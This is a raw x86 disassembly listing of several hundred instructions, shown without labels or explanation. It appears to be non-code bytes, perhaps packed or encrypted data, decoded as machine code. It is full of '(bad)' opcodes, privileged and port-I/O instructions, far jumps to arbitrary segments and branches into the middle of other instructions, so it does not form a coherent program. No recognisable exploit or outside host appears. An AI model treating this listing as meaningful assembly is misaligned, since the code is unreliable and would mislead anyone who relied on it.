  40b4d2:	push   es
  40b4d3:	lahf   
  40b4d4:	mov    ebx,0x7f7380b3
  40b4d9:	cmc    
  40b4da:	mov    ebp,0x858f5ae9
  40b4df:	or     eax,0x2d5d547d
  40b4e4:	in     al,0x29
  40b4e6:	cmp    ecx,DWORD PTR [edi-0x7e8de795]
  40b4ec:	arpl   WORD PTR [edi+0x5d],cx
  40b4ef:	pushf  
  40b4f0:	xor    al,0x83
  40b4f2:	push   0xffffffb6
  40b4f4:	or     al,0x22
  40b4f6:	jb     0x40b572
  40b4f8:	sub    cl,BYTE PTR gs:[ebp+0x16]
  40b4fc:	stos   DWORD PTR es:[edi],eax
  40b4fd:	or     ah,bl
  40b4ff:	(bad)  
  40b500:	(bad)  
  40b501:	sub    ebx,DWORD PTR gs:[edi-0x54]
  40b505:	xchg   edx,eax
  40b506:	and    DWORD PTR [ebp+0x73f83270],ebx
  40b50c:	sub    ebx,esi
  40b50e:	dec    eax
  40b50f:	mov    dl,0x60
  40b511:	ins    DWORD PTR es:[edi],dx
  40b512:	push   cs
  40b513:	ss pushf 
  40b515:	cwde   
  40b516:	fstp   QWORD PTR ss:[eax-0x5ae62b78]
  40b51d:	fcom   st(0)
  40b51f:	inc    esp
  40b520:	or     eax,0xc6d980f2
  40b525:	aaa    
  40b526:	mov    eax,0x311752b6
  40b52b:	push   eax
  40b52c:	xor    BYTE PTR [ebx-0x5b6556b7],ch
  40b532:	out    dx,al
  40b533:	mov    esp,0xf3b25e30
  40b538:	and    BYTE PTR [edi+0x48],bl
  40b53b:	(bad)  [esi-0x5e]
  40b53e:	les    ebx,FWORD PTR [edx+0x79]
  40b541:	ja     0x40b5b5
  40b543:	push   0x7c734798
  40b548:	pusha  
  40b549:	movq   mm1,QWORD PTR [edx]
  40b54c:	fsubr  QWORD PTR [ebx-0x20]
  40b54f:	and    eax,0x24afef6a
  40b554:	out    dx,al
  40b555:	and    ch,BYTE PTR [eax]
  40b557:	pop    ss
  40b558:	sub    BYTE PTR [edx-0x658a1da4],0x8c
  40b55f:	loop   0x40b4e2
  40b561:	jnp    0x40b517
  40b563:	xchg   ebx,eax
  40b564:	icebp  
  40b565:	cmp    DWORD PTR [edx+esi*1],esi
  40b568:	test   ch,al
  40b56a:	sbb    DWORD PTR [eax-0x49cf67af],0x7295be6b
  40b574:	mov    esi,0x36c53241
  40b579:	dec    ecx
  40b57a:	cmp    ah,BYTE PTR [esp+edx*1-0x2c17bc40]
  40b581:	pop    esp
  40b582:	lahf   
  40b583:	comiss xmm7,DWORD PTR [edx]
  40b586:	rcr    BYTE PTR [ecx-0x55d3e7c0],cl
  40b58c:	add    eax,0xb136a6d2
  40b591:	(bad)  
  40b592:	adc    eax,DWORD PTR gs:[ebp-0x5f89ea8a]
  40b599:	add    eax,0x736138f0
  40b59e:	inc    esp
  40b59f:	and    al,0xe4
  40b5a1:	xor    dh,BYTE PTR [ebp-0x4e]
  40b5a4:	pop    ebp
  40b5a5:	mov    ds:0x365e5758,eax
  40b5aa:	cdq    
  40b5ab:	clts   
  40b5ad:	fld    st(4)
  40b5af:	jmp    0x40b5ef
  40b5b1:	or     al,0x17
  40b5b3:	mov    ds:0x1b019b7d,eax
  40b5b8:	xor    dl,BYTE PTR [eax]
  40b5ba:	iret   
  40b5bb:	xor    edi,DWORD PTR ss:[esi]
  40b5be:	xchg   ebx,eax
  40b5bf:	std    
  40b5c0:	mov    edi,0x269169a
  40b5c5:	sub    ebp,DWORD PTR [ebp+0x69]
  40b5c8:	test   DWORD PTR [ecx-0x5a211149],0x8bbb3a18
  40b5d2:	ss js  0x40b5fb
  40b5d5:	popf   
  40b5d6:	xchg   DWORD PTR [edi+0xae5c49b],esi
  40b5dc:	jge    0x40b59c
  40b5de:	out    0xae,al
  40b5e0:	mov    ebp,0xd2951a38
  40b5e5:	jp     0x40b614
  40b5e7:	out    0xe6,al
  40b5e9:	mov    WORD PTR [edi],cs
  40b5eb:	sbb    al,0x74
  40b5ed:	out    dx,eax
  40b5ee:	and    dl,BYTE PTR [ebp+edx*8-0x3e]
  40b5f2:	push   0x3a14d80d
  40b5f7:	push   ebp
  40b5f8:	mov    ds:0x64348191,eax
  40b5fd:	and    al,0x6a
  40b5ff:	fwait
  40b600:	jge    0x40b662
  40b602:	pushf  
  40b603:	adc    al,0x43
  40b605:	mov    eax,ebx
  40b607:	and    DWORD PTR [edi-0x5f1ff981],ebx
  40b60d:	rcl    ecx,cl
  40b60f:	call   0x7d47358
  40b614:	jecxz  0x40b639
  40b616:	cmp    al,0xcf
  40b618:	cmp    edi,edx
  40b61a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b61b:	sti    
  40b61c:	pushf  
  40b61d:	ds mov bh,0xdd
  40b620:	jmp    0x40b62b
  40b622:	packuswb mm7,QWORD PTR [eax-0x4d2ca670]
  40b629:	push   ss
  40b62a:	pop    ss
  40b62b:	add    BYTE PTR [edx],0xda
  40b62e:	sub    BYTE PTR [edx],cl
  40b630:	fwait
  40b631:	jmp    FWORD PTR [edi-0x5ff61348]
  40b637:	repnz out dx,al
  40b639:	jbe    0x40b63a
  40b63b:	shr    DWORD PTR [esi-0x59cb23d9],1
  40b641:	popa   
  40b642:	sti    
  40b643:	outs   dx,BYTE PTR ds:[esi]
  40b644:	adc    eax,0x4a0a133d
  40b649:	shl    DWORD PTR [edi],cl
  40b64b:	mov    eax,ds:0xbcf75708
  40b650:	add    ecx,edi
  40b652:	mov    eax,0xcc9e1bb4
  40b657:	test   al,0x5c
  40b659:	imul   DWORD PTR [esi]
  40b65b:	fadd   st(6),st
  40b65d:	es popf 
  40b65f:	retf   0x17ec
  40b662:	outs   dx,DWORD PTR gs:[esi]
  40b664:	out    dx,al
  40b665:	xchg   edx,eax
  40b666:	arpl   WORD PTR [ebx-0x1],cx
  40b669:	enter  0x5874,0x22
  40b66d:	sub    esi,eax
  40b66f:	jmp    0x40b617
  40b671:	pop    ss
  40b672:	arpl   WORD PTR [esi+eiz*2-0x403fb1ec],bp
  40b679:	xor    al,0xa5
  40b67b:	loopne 0x40b694
  40b67d:	scas   al,BYTE PTR es:[edi]
  40b67e:	adc    BYTE PTR [eax+0x43da1b8f],cl
  40b684:	fcmovnb st,st(2)
  40b686:	mov    ecx,0x826ec63f
  40b68c:	inc    ebp
  40b68d:	jnp    0x40b6c0
  40b68f:	fnstsw WORD PTR [esp+0xe]
  40b693:	mov    ecx,0x389892ae
  40b698:	inc    ebx
  40b699:	test   eax,0x94593a3b
  40b69e:	mov    eax,ds:0xacd48f78
  40b6a3:	sub    eax,eax
  40b6a5:	in     al,0xc6
  40b6a7:	sbb    BYTE PTR [ecx-0x7fd458ef],cl
  40b6ad:	jmp    0x4ff4:0x3d9dce12
  40b6b4:	or     esi,esi
  40b6b6:	inc    esi
  40b6b7:	mov    dl,0x1d
  40b6b9:	test   DWORD PTR [esi-0x5b152b68],edi
  40b6bf:	sbb    DWORD PTR [eax-0x3f],0xffffffa4
  40b6c3:	std    
  40b6c4:	push   edi
  40b6c5:	dec    edx
  40b6c6:	cld    
  40b6c7:	inc    ecx
  40b6c8:	inc    ebx
  40b6c9:	pusha  
  40b6ca:	shl    BYTE PTR [ebx+eax*2],cl
  40b6cd:	fild   QWORD PTR [ebp-0x37]
  40b6d0:	stos   BYTE PTR es:[edi],al
  40b6d1:	or     DWORD PTR [edi+ebx*2+0x12],ecx
  40b6d5:	or     eax,0x52df3477
  40b6da:	repnz cli 
  40b6dc:	pop    ds
  40b6dd:	inc    eax
  40b6de:	in     al,dx
  40b6df:	nop
  40b6e0:	mov    DWORD PTR [ecx],esp
  40b6e2:	ja     0x40b6f5
  40b6e4:	into   
  40b6e5:	mov    ecx,0x338e7245
  40b6ea:	ror    DWORD PTR [ebp+eiz*1+0x34589e3f],cl
  40b6f1:	mov    eax,0xf3007af3
  40b6f6:	sbb    dl,ch
  40b6f8:	outs   dx,BYTE PTR ds:[esi]
  40b6f9:	cmp    bh,BYTE PTR [ecx+0x42]
  40b6fc:	jno    0x40b688
  40b6fe:	out    0xaf,al
  40b700:	mov    eax,ds:0x15bdd12c
  40b705:	push   0xfffffff2
  40b707:	add    ch,bl
  40b709:	and    eax,0x111014c5
  40b70e:	dec    ebx
  40b70f:	or     bl,BYTE PTR [ebp+0x56]
  40b712:	shl    DWORD PTR [eax-0x22],0x5
  40b716:	stc    
  40b717:	or     al,0x9c
  40b719:	push   0x61
  40b71b:	sub    ebp,DWORD PTR [eax-0x14]
  40b71e:	leave  
  40b71f:	add    BYTE PTR [ebp-0x76],bl
  40b722:	cs mov edi,0xf7ef7733
  40b728:	push   esp
  40b729:	repnz into 
  40b72b:	mov    DWORD PTR [ebx],eax
  40b72d:	cld    
  40b72e:	adc    eax,0xb3226351
  40b733:	lea    esp,[eax+0x9681ee6]
  40b739:	fbld   TBYTE PTR [esi-0x79]
  40b73c:	jle    0x40b736
  40b73e:	cld    
  40b73f:	mov    DWORD PTR [esi],0x648a8f80
  40b745:	fimul  DWORD PTR [esi+eax*2]
  40b748:	mov    bl,0x2
  40b74a:	cmp    BYTE PTR [ecx+0x2b2348fe],bh
  40b750:	xlat   BYTE PTR ds:[ebx]
  40b751:	hlt    
  40b752:	xchg   esp,eax
  40b753:	cmp    BYTE PTR [esi+0x67],ah
  40b756:	push   eax
  40b757:	out    0xf5,eax
  40b759:	dec    edi
  40b75a:	adc    DWORD PTR [esi+0x7d],ebp
  40b75d:	pushf  
  40b75e:	and    edx,DWORD PTR [esi-0x74748969]
  40b764:	mov    ebp,0xaa730618
  40b769:	jo     0x40b7dd
  40b76b:	cmp    bl,BYTE PTR [esi+0x4f957481]
  40b771:	pop    esi
  40b772:	sub    DWORD PTR [esi-0x7ddf2224],0x58812e3
  40b77c:	stc    
  40b77d:	push   0x3e95b165
  40b782:	je     0x40b7d3
  40b784:	out    dx,al
  40b785:	xor    eax,0xe9495ce
  40b78a:	xchg   edi,eax
  40b78b:	xchg   ebp,eax
  40b78d:	cld    
  40b78e:	and    al,0xc2
  40b790:	out    0x7f,eax
  40b792:	lods   al,BYTE PTR ds:[esi]
  40b793:	jns    0x40b75f
  40b795:	inc    eax
  40b796:	mov    dh,0xed
  40b798:	xor    cl,BYTE PTR [eax-0x5]
  40b79b:	sub    eax,0x1726444c
  40b7a0:	sub    edi,DWORD PTR [edi+0x47]
  40b7a3:	outs   dx,BYTE PTR ds:[esi]
  40b7a4:	jno    0x40b79f
  40b7a6:	scas   eax,DWORD PTR es:[edi]
  40b7a7:	(bad)  
  40b7a8:	nop
  40b7a9:	outs   dx,DWORD PTR ds:[esi]
  40b7aa:	sub    eax,0x4f8b16fe
  40b7af:	xchg   esi,eax
  40b7b0:	loopne 0x40b7fa
  40b7b2:	shr    BYTE PTR [eax-0x26],cl
  40b7b5:	fcmovne st,st(5)
  40b7b7:	inc    ecx
  40b7b8:	sahf   
  40b7b9:	sub    edi,edi
  40b7bb:	and    cl,dl
  40b7bd:	sahf   
  40b7be:	sti    
  40b7bf:	add    bh,al
  40b7c1:	xor    ah,BYTE PTR [edx-0x7b5445bc]
  40b7c7:	fisttp QWORD PTR [edi+ebx*1]
  40b7ca:	stos   DWORD PTR es:[edi],eax
  40b7cb:	fs push edi
  40b7cd:	or     cl,BYTE PTR [esi+0x6]
  40b7d0:	ins    DWORD PTR es:[edi],dx
  40b7d1:	mov    ah,BYTE PTR [edx*4+0x3b9ef825]
  40b7d8:	inc    sp
  40b7da:	jnp    0x40b7da
  40b7dc:	test   eax,0xe22f8870
  40b7e1:	push   eax
  40b7e2:	jbe    0x40b815
  40b7e4:	xlat   BYTE PTR ds:[ebx]
  40b7e5:	pop    ds
  40b7e6:	rcl    dh,0xb2
  40b7e9:	xchg   ebp,eax
  40b7eb:	ja     0x40b777
  40b7ed:	sahf   
  40b7ee:	mov    ebx,0xbca3a7d3
  40b7f3:	cmp    BYTE PTR [esi-0x16d0149e],ch
  40b7f9:	popf   
  40b7fa:	push   0x9bbccdbb
  40b7ff:	or     bl,BYTE PTR [esi-0x798f01a3]
  40b805:	mov    ah,cl
  40b807:	test   DWORD PTR [ebx],0xce6483c7
  40b80d:	daa    
  40b80e:	outs   dx,DWORD PTR ds:[esi]
  40b80f:	adc    al,BYTE PTR ds:0x7401b513
  40b815:	jge    0x40b87e
  40b817:	es inc ebx
  40b819:	or     al,0x6
  40b81b:	push   edi
  40b81c:	or     bl,BYTE PTR [edx+eiz*2]
  40b81f:	sub    DWORD PTR [edi+edx*1-0x21],eax
  40b823:	cs icebp 
  40b825:	xlat   BYTE PTR ds:[ebx]
  40b826:	mov    ah,BYTE PTR [eax-0x3ce9eda5]
  40b82c:	scas   eax,DWORD PTR es:[edi]
  40b82d:	sub    DWORD PTR [ecx*4+0xe66071c],eax
  40b834:	xor    al,0x89
  40b836:	aaa    
  40b837:	pusha  
  40b838:	dec    edx
  40b839:	fisub  WORD PTR [edi]
  40b83b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b83c:	mov    ebx,0xe9f80df9
  40b841:	jp     0x40b7dc
  40b843:	addr16 inc edi
  40b845:	ds out 0x45,al
  40b848:	sbb    eax,DWORD PTR [ecx-0x6910d467]
  40b84e:	js     0x40b805
  40b850:	lods   al,BYTE PTR ds:[esi]
  40b851:	(bad)  
  40b852:	and    al,dl
  40b854:	retf   0x1dcb
  40b857:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b858:	add    edx,ebp
  40b85a:	imul   edx,DWORD PTR [edi],0xc8d91e95
  40b860:	inc    ecx
  40b861:	dec    ebx
  40b862:	sahf   
  40b863:	adc    DWORD PTR [edi],esi
  40b865:	icebp  
  40b866:	inc    esp
  40b867:	hlt    
  40b868:	sbb    ah,BYTE PTR [ecx]
  40b86a:	push   edx
  40b86b:	push   eax
  40b86c:	jo     0x40b86c
  40b86e:	addr16 adc eax,0x5fa640dc
  40b874:	and    eax,0x36a341c5
  40b879:	gs push 0x80678431
  40b87f:	adc    eax,DWORD PTR [ebx]
  40b881:	add    DWORD PTR [ebx-0x7a],0x44
  40b885:	dec    ebp
  40b886:	(bad)  
  40b887:	loop   0x40b8a4
  40b889:	dec    edx
  40b88a:	sahf   
  40b88b:	sbb    BYTE PTR [eax-0x56],al
  40b88e:	cmp    BYTE PTR [esi-0x6759a713],dl
  40b894:	jbe    0x40b898
  40b896:	scas   eax,DWORD PTR es:[edi]
  40b897:	sbb    al,0x5f
  40b899:	cwde   
  40b89a:	sub    eax,DWORD PTR ds:0xf14d9382
  40b8a0:	outs   dx,DWORD PTR ds:[esi]
  40b8a1:	repnz cmp al,BYTE PTR [ebx+edx*4+0x4e4c6a8c]
  40b8a9:	jmp    0xc9f6:0x3939f76a
  40b8b0:	jae    0x40b861
  40b8b2:	(bad)  
  40b8b3:	dec    edi
  40b8b4:	mov    dh,0xc9
  40b8b6:	js     0x40b84a
  40b8b8:	cmc    
  40b8b9:	push   edx
  40b8ba:	mov    ds:0x2d3a9989,eax
  40b8bf:	add    al,0x4b
  40b8c1:	ret    0x38ab
  40b8c4:	loope  0x40b872
  40b8c6:	int3   
  40b8c7:	idiv   BYTE PTR [esi+ecx*2]
  40b8ca:	dec    ecx
  40b8cb:	sub    eax,0x6ee994c4
  40b8d0:	fwait
  40b8d1:	test   al,0x3b
  40b8d3:	js     0x40b94d
  40b8d5:	lods   eax,DWORD PTR ds:[esi]
  40b8d6:	pop    edi
  40b8d7:	loope  0x40b920
  40b8d9:	pop    esp
  40b8da:	pop    edx
  40b8db:	xor    DWORD PTR [edx+0x24281c66],esi
  40b8e1:	sub    BYTE PTR [edi],bh
  40b8e3:	add    DWORD PTR [ebx+eax*2],0x65
  40b8e7:	jle    0x40b944
  40b8e9:	js     0x40b959
  40b8eb:	sub    BYTE PTR [esi-0x518bf24a],bl
  40b8f1:	repnz xchg edx,eax
  40b8f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8f4:	mov    ebx,0xa235ebb7
  40b8f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8fa:	pushf  
  40b8fb:	xchg   esi,eax
  40b8fc:	sbb    eax,0xdea9daf9
  40b901:	shr    DWORD PTR [ecx+0x42acd499],cl
  40b907:	nop
  40b908:	cli    
  40b909:	adc    edi,DWORD PTR [ebx]
  40b90b:	scas   eax,DWORD PTR es:[edi]
  40b90c:	mov    ?,WORD PTR [ebx+0x7a]
  40b90f:	test   eax,0x7f295405
  40b914:	ss sahf 
  40b916:	in     al,0x51
  40b918:	aam    0x98
  40b91a:	sbb    BYTE PTR [ebp+0x326cbb41],ch
  40b920:	les    esp,FWORD PTR [eax-0x58]
  40b923:	jb     0x40b994
  40b925:	daa    
  40b926:	fcmovnbe st,st(1)
  40b928:	sub    BYTE PTR [edx],ch
  40b92a:	mov    bh,0xbd
  40b92c:	popa   
  40b92d:	inc    esi
  40b92e:	mov    esi,ebx
  40b930:	mov    BYTE PTR [eax+0x4b05111b],0x1e
  40b937:	and    eax,DWORD PTR [esi]
  40b939:	fdiv   st,st(2)
  40b93b:	rol    eax,1
  40b93d:	mov    bh,0x68
  40b93f:	sar    BYTE PTR [edi-0x3a53d3a7],1
  40b945:	jne    0x40b95e
  40b947:	mov    eax,0xdd72cc56
  40b94c:	add    ebx,0xf3f08c7
  40b952:	add    BYTE PTR [ecx-0x48c79bc5],cl
  40b958:	(bad)  
  40b95a:	fldcw  WORD PTR [edx-0x7d]
  40b95d:	retf   0xb46c
  40b960:	push   ss
  40b961:	cs ss xchg esp,eax
  40b964:	mov    ecx,0x414fd7b7
  40b969:	jb     0x40b919
  40b96b:	cld    
  40b96c:	fwait
  40b96d:	test   DWORD PTR [eax],ebx
  40b96f:	jne    0x40b935
  40b971:	aad    0xb3
  40b973:	mov    eax,ds:0xc22eedc6
  40b978:	jne    0x40b9a5
  40b97a:	mov    ds:0x46760455,al
  40b97f:	jno    0x40b96b
  40b981:	push   esi
  40b982:	test   eax,0x26290ed5
  40b987:	sub    DWORD PTR ds:0xf3a5ec95,edx
  40b98d:	test   esp,eax
  40b98f:	iret   
  40b990:	js     0x40b968
  40b992:	test   al,0xe7
  40b994:	push   ss
  40b995:	shl    BYTE PTR [ebp+ebp*2+0x59],0xe1
  40b99a:	fsub   st(4),st
  40b99c:	xor    bl,BYTE PTR ds:0x6a89c3ec
  40b9a2:	jnp    0x40b930
  40b9a4:	xchg   BYTE PTR [edx+0x11],cl
  40b9a7:	mov    BYTE PTR [ebp-0x37],bl
  40b9aa:	xchg   DWORD PTR [eax+0x5b],ebp
  40b9ad:	repnz into 
  40b9af:	xor    eax,0xe1a05ed1
  40b9b4:	aaa    
  40b9b5:	xchg   esp,eax
  40b9b6:	dec    ecx
  40b9b7:	push   eax
  40b9b8:	push   0x2e58a898
  40b9bd:	push   0xffffffea
  40b9bf:	in     al,dx
  40b9c0:	push   edi
  40b9c1:	dec    eax
  40b9c2:	test   eax,0xaba75536
  40b9c7:	call   0xdfff3229
  40b9cc:	lods   eax,DWORD PTR ds:[esi]
  40b9cd:	lods   al,BYTE PTR ds:[esi]
  40b9ce:	sub    al,0xe4
  40b9d0:	mov    gs,edx
  40b9d2:	cmc    
  40b9d3:	inc    edx
  40b9d4:	ss scas al,BYTE PTR es:[edi]
  40b9d6:	sub    al,0xeb
  40b9d8:	xor    edx,esp
  40b9da:	das    
  40b9db:	ret    0x6ae4
  40b9de:	pop    ss
  40b9df:	cmp    eax,0x6462e364
  40b9e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9e5:	mov    edx,0xa159a46d
  40b9ea:	mov    edi,0x384a2732
  40b9ef:	(bad)  
  40b9f0:	cmp    esp,ecx
  40b9f2:	push   esp
  40b9f3:	dec    ecx
  40b9f4:	int3   
  40b9f5:	dec    esi
  40b9f6:	mov    esp,0xd95e0df1
  40b9fb:	fdivr  QWORD PTR [ebx-0x3793bedd]
  40ba01:	dec    bx
  40ba03:	(bad)  
  40ba04:	jno    0x40ba08
  40ba06:	add    ah,bl
  40ba08:	std    
  40ba09:	fld    QWORD PTR [esi]
  40ba0b:	mov    eax,0xd71b4927
  40ba10:	mov    edi,0x6efdbf9e
  40ba15:	ja     0x40ba4e
  40ba17:	and    BYTE PTR [ebp*2-0x19c5acec],0x19
  40ba1f:	jmp    0x5f829c56
  40ba24:	dec    ebx
  40ba25:	add    BYTE PTR [edi-0x29],bl
  40ba28:	mov    ?,ecx
  40ba2a:	lods   eax,DWORD PTR ds:[esi]
  40ba2b:	inc    esi
  40ba2c:	or     DWORD PTR [ebx],ebx
  40ba2e:	or     edx,eax
  40ba30:	mov    eax,0x8cf6f7f6
  40ba35:	retf   
  40ba36:	popf   
  40ba37:	scas   eax,DWORD PTR es:[edi]
  40ba38:	lods   eax,DWORD PTR cs:[esi]
  40ba3a:	sahf   
  40ba3b:	mov    ebx,0xed7c006a
  40ba40:	cmp    DWORD PTR [edx],ebp
  40ba42:	and    BYTE PTR [edx-0x11e35306],dl
  40ba48:	sbb    BYTE PTR [ebx],cl
  40ba4a:	push   es
  40ba4b:	pusha  
  40ba4c:	dec    ebx
  40ba4d:	cmp    cl,BYTE PTR [edx-0xb438b44]
  40ba53:	div    DWORD PTR [esi]
  40ba55:	sbb    dh,0x86
  40ba58:	and    esi,ebx
  40ba5a:	inc    edi
  40ba5b:	inc    ebx
  40ba5c:	mov    esp,0xf05e0dc6
  40ba61:	in     al,dx
  40ba62:	sbb    al,0x4e
  40ba64:	shl    edi,1
  40ba66:	movnti DWORD PTR ss:[edx],esi
  40ba6a:	xor    eax,0x9fc3f3a7
  40ba6f:	aaa    
  40ba70:	sbb    BYTE PTR [edi+0x34],0xa8
  40ba74:	sahf   
  40ba75:	push   ss
  40ba76:	sahf   
  40ba77:	cli    
  40ba78:	aam    0x35
  40ba7a:	pop    esi
  40ba7b:	adc    al,0x3b
  40ba7d:	jge    0x40ba65
  40ba7f:	stc    
  40ba80:	rcl    DWORD PTR [esi],1
  40ba82:	xchg   ecx,eax
  40ba83:	adc    eax,0xd464f796
  40ba88:	(bad)  
  40ba89:	xchg   esi,eax
  40ba8a:	xor    ecx,ebp
  40ba8c:	and    esi,esp
  40ba8e:	out    0x39,eax
  40ba90:	mov    dh,BYTE PTR [ecx]
  40ba92:	push   esp
  40ba93:	int3   
  40ba94:	mov    edx,DWORD PTR [edx+ebp*8]
  40ba97:	jbe    0x40bada
  40ba99:	mov    ebx,0x324e1b2d
  40ba9e:	cmp    DWORD PTR [esp-0x516d9291],ebp
  40baa5:	pop    ss
  40baa6:	sar    DWORD PTR [esi-0x5f49ae08],0x12
  40baad:	and    al,0x8f
  40baaf:	sbb    al,0xe6
  40bab1:	cmc    
  40bab2:	jnp    0x40ba9c
  40bab4:	cmp    BYTE PTR [edi+edx*2-0x20672e10],cl
  40babb:	hlt    
  40babc:	mov    esp,0xa61761d4
  40bac1:	xchg   BYTE PTR [edx+0x4eb8892a],ah
  40bac7:	pop    ss
  40bac8:	scas   eax,DWORD PTR es:[edi]
  40bac9:	dec    ecx
  40baca:	mov    ah,0x12
  40bacc:	sahf   
  40bacd:	add    al,0x95
  40bacf:	inc    ebp
  40bad0:	call   0x9c73:0xf336909f
  40bad7:	xchg   ecx,eax
  40bad8:	cli    
  40bad9:	and    eax,DWORD PTR [ebx+esi*1]
  40badc:	mov    dh,0x4c
  40bade:	stc    
  40badf:	adc    DWORD PTR [ebx],ecx
  40bae1:	jg     0x40ba80
  40bae3:	jmp    0x7d1dd0f7
  40bae8:	mov    ds:0xe2117f9e,al
  40baed:	pop    ecx
  40baee:	sbb    al,0xb3
  40baf0:	mov    ch,0xce
  40baf2:	test   al,0xea
  40baf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baf5:	leave  
  40baf6:	inc    eax
  40baf7:	fwait
  40baf8:	adc    eax,ecx
  40bafa:	test   BYTE PTR [edi-0x5c],bl
  40bafd:	rcr    al,cl
  40baff:	jmp    0x64abaf68
  40bb04:	mov    cl,0x4a
  40bb06:	sub    eax,0xfd051f
  40bb0b:	addr16 push cs
  40bb0d:	xlat   BYTE PTR ds:[ebx]
  40bb0e:	jl     0x40bb85
  40bb10:	cld    
  40bb11:	mov    ch,0x1a
  40bb13:	cwde   
  40bb14:	adc    ecx,edi
  40bb16:	cmc    
  40bb17:	mov    esi,0xd316a5d3
  40bb1c:	call   DWORD PTR [ecx]
  40bb1e:	in     eax,dx
  40bb1f:	mov    ch,0x72
  40bb21:	xchg   esp,eax
  40bb22:	std    
  40bb23:	lods   al,BYTE PTR ds:[esi]
  40bb24:	loop   0x40bba2
  40bb26:	ins    DWORD PTR es:[edi],dx
  40bb27:	jno    0x40bb9c
  40bb29:	enter  0x2ca5,0x12
  40bb2d:	lea    ebp,[ebx-0x66]
  40bb30:	xor    bl,BYTE PTR [esi]
  40bb32:	dec    ebx
  40bb33:	gs xchg edx,eax
  40bb35:	fimul  WORD PTR [ebp+0x33f27ef9]
  40bb3b:	cmp    BYTE PTR [ecx],dl
  40bb3d:	pop    eax
  40bb3e:	fucompp 
  40bb40:	int    0xbf
  40bb42:	outs   dx,BYTE PTR ds:[esi]
  40bb43:	test   DWORD PTR ds:0xf8814ed,ebp
  40bb49:	inc    eax
  40bb4a:	adc    ebx,edi
  40bb4c:	inc    ebp
  40bb4d:	xchg   edi,eax
  40bb4e:	fdivr  QWORD PTR [edx+0x47]
  40bb51:	ret    
  40bb52:	ss repz xchg edx,eax
  40bb55:	mov    esi,0x7fd024e4
  40bb5a:	xor    BYTE PTR [eax+0x364e4e02],bl
  40bb60:	or     BYTE PTR [edi+0x17],dl
  40bb63:	xchg   esi,eax
  40bb64:	xchg   DWORD PTR [eax],edi
  40bb66:	ret    
  40bb67:	mov    edx,0xeca0044e
  40bb6c:	xchg   ebp,eax
  40bb6d:	data16 mov al,ah
  40bb70:	sub    DWORD PTR [edx-0x5c],0xfffffff6
  40bb74:	xchg   ebp,eax
  40bb75:	jns    0x40bb8e
  40bb77:	pop    eax
  40bb78:	ja     0x40bb05
  40bb7a:	xchg   edi,eax
  40bb7b:	fst    QWORD PTR [esi+0x49]
  40bb7e:	or     esi,DWORD PTR gs:[edx]
  40bb81:	iret   
  40bb82:	mov    ebx,0xf35487db
  40bb87:	popf   
  40bb88:	adc    eax,0x83b50a88
  40bb8d:	push   esi
  40bb8e:	fst    QWORD PTR [ebx+0x34970d9]
  40bb94:	orps   xmm7,XMMWORD PTR [ebx-0x59ea5d25]
  40bb9b:	test   BYTE PTR [edx+0x73e3cf8a],dh
  40bba1:	outs   dx,DWORD PTR ds:[esi]
  40bba2:	pop    esp
  40bba3:	retf   
  40bba4:	fwait
  40bba5:	pop    ebx
  40bba6:	icebp  
  40bba7:	shl    DWORD PTR [eax-0x6edd109],1
  40bbad:	push   es
  40bbae:	mov    ah,0x84
  40bbb0:	ja     0x40bc1c
  40bbb2:	push   ecx
  40bbb3:	and    eax,0x4ed73839
  40bbb8:	jb     0x40bc21
  40bbba:	idiv   BYTE PTR [ebp+0x21]
  40bbbd:	sqrtps xmm7,xmm0
  40bbc0:	outs   dx,DWORD PTR ds:[esi]
  40bbc1:	icebp  
  40bbc2:	lock mov edi,0x5c53126e
  40bbc8:	mov    al,0xb4
  40bbca:	inc    ebx
  40bbcb:	sub    eax,0x7a7f975c
  40bbd0:	imul   edi,DWORD PTR [edx],0xffffffc6
  40bbd3:	fisttp DWORD PTR [ebx+0x45b97a59]
  40bbd9:	mov    ebp,0x849a444
  40bbde:	aaa    
  40bbdf:	cmp    ebp,DWORD PTR [eax-0x7b622e50]
  40bbe5:	inc    ebp
  40bbe6:	sbb    ah,bh
  40bbe8:	retf   0xc5ea
  40bbeb:	inc    ecx
  40bbec:	jnp    0x40bb72
  40bbee:	push   0x59
  40bbf0:	iret   
  40bbf1:	jge    0x40bbb1
  40bbf3:	lds    ebp,FWORD PTR [esi+0x262c3c7f]
  40bbf9:	loopne 0x40bc4d
  40bbfb:	and    eax,0x9b3a697b
  40bc00:	xor    eax,0x7bb2c359
  40bc05:	mov    ebx,0xd6e911be
  40bc0a:	and    esi,0xffffff92
  40bc0d:	xor    al,0x42
  40bc0f:	or     ecx,edi
  40bc11:	push   DWORD PTR [edi-0x2a3a4094]
  40bc17:	or     ch,BYTE PTR [esp+eax*8-0x579489d8]
  40bc1e:	dec    esi
  40bc1f:	jl     0x40bbe3
  40bc21:	loop   0x40bc64
  40bc23:	mov    ecx,ecx
  40bc25:	repz or edx,0xffffff84
  40bc29:	mov    ebx,0xfd70b597
  40bc2e:	call   0x135:0x683a4d57
  40bc35:	daa    
  40bc36:	push   eax
  40bc37:	pop    edi
  40bc38:	sbb    eax,eax
  40bc3a:	mov    dl,0xfd
  40bc3c:	mov    cl,0x2b
  40bc3e:	test   DWORD PTR [edx+0x7b942ead],ecx
  40bc44:	icebp  
  40bc45:	jno    0x40bbd0
  40bc47:	cs push ebx
  40bc49:	(bad)  
  40bc4a:	and    eax,0x370b7af7
  40bc4f:	dec    ebx
  40bc50:	lods   eax,DWORD PTR ds:[esi]
  40bc51:	pop    ds
  40bc52:	mov    ch,0x78
  40bc54:	rcl    DWORD PTR [eax*1-0x2c121265],cl
  40bc5b:	mov    ebp,DWORD PTR [edx]
  40bc5d:	pop    esi
  40bc5e:	sar    bh,0x3b
  40bc61:	das    
  40bc62:	sti    
  40bc63:	sbb    BYTE PTR [edx-0x11],0xa4
  40bc67:	mov    ecx,0x9fa090ff
  40bc6c:	lock mov ebp,es
  40bc6f:	retf   
  40bc70:	(bad)  
  40bc71:	in     al,dx
  40bc72:	xchg   ebx,eax
  40bc73:	push   ss
  40bc74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
